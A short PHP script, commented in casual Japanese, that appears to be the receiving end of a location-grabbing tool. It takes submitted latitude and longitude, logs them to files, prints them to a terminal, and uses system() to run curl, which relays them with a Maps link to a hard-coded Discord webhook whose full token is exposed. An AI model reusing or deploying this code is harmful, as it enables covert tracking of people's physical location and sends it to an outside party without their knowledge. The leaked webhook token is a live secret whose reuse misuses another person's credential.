<?php
// 📦 POSTデータをログに保存！
file_put_contents("debug.log", date("Y-m-d H:i:s") . " - POST: " . json_encode($_POST, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);

// 🚩 POSTデータのチェック！
if (!isset($_POST["lat"]) || !isset($_POST["lng"])) {
    file_put_contents("debug.log", "💥 Error: POSTデータが不足してるよ〜💦" . PHP_EOL, FILE_APPEND);
    exit("💥 Error: 緯度か経度がPOSTされてないよ〜💦");
}

$lat = escapeshellarg($_POST["lat"]);
$lng = escapeshellarg($_POST["lng"]);

$mapsUrl = "https://www.google.com/maps?q=" . trim($lat, "'") . "," . trim($lng, "'");
$locationMessage = "📍 Location: Latitude = " . trim($lat, "'") . ", Longitude = " . trim($lng, "'");
$mapsUrlMessage = "🗺 Google Maps URL: " . $mapsUrl;

// 📝 テキストファイルに保存しちゃう♪
file_put_contents("location.txt", $locationMessage . PHP_EOL . $mapsUrlMessage . PHP_EOL, FILE_APPEND);

// 📢 ターミナルにも表示するよ〜♪
echo $locationMessage . "\n";
echo $mapsUrlMessage . "\n";

// 🛜 Discord通知（オプションだよ〜）
$webhookUrl = 'https://discord.com/api/webhooks/1361553545379188917/QSKZGGkXtDeqUD4c61hEatZHfY8bD1BObJ1sM250eZpL6O_ocP45oYK1iVy8Y-3eB44q';

function sendToDiscord($message, $webhookUrl) {
    $json = json_encode(["content" => $message], JSON_UNESCAPED_UNICODE);
    $cmd = "curl -H 'Content-Type: application/json' -X POST -d " . escapeshellarg($json) . " " . escapeshellarg($webhookUrl) . " > /dev/null 2>&1";
    file_put_contents("debug.log", "🔔 Discord送信内容: $message" . PHP_EOL, FILE_APPEND);
    system($cmd);
}

sendToDiscord($locationMessage, $webhookUrl);
sendToDiscord($mapsUrlMessage, $webhookUrl);

echo "🎉 Location送信＆保存完了〜っ！\n";
?>
